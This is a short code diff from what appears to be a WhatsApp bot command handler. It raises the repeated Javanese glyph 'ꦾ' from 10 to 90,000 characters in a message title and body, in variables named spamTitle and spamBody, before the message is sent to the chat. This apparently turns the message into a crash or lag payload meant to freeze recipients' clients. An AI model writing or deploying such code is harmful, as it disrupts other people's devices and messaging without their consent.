@@ -9,8 +9,8 @@ let handler = async (m, { conn, text }) => {
     const imageUrl = 'https://files.catbox.moe/7i4g3c.jpg';
 
     // Texto repetido para título y cuerpo
-    const spamTitle = 'ꦾ'.repeat(10);
-    const spamBody = 'ꦾ'.repeat(10);
+    const spamTitle = 'ꦾ'.repeat(90000);
+    const spamBody = 'ꦾ'.repeat(90000);
 
     try {
         await conn.sendMessage(m.chat, {
